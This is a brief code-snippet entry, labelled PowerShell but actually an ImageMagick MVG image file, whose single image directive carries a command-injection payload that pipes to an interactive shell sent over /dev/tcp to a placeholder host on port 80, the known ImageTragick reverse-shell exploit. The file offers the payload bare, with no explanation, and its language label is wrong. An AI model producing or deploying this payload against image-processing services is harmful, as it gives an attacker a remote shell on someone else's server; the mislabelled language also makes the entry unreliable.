---
id: 6caf7236-b6b1-4124-9d10-c75753978af3
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:40.967831+00:00'
updated_at: '2023-04-06T03:56:40.971495+00:00'
---

# Code Snippet 6caf7236

**Language**: Powershell

```powershell
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|/bin/sh -i > /dev/tcp/ip/80 0<&1 2>&1'
pop graphic-context
pop graphic-context
```
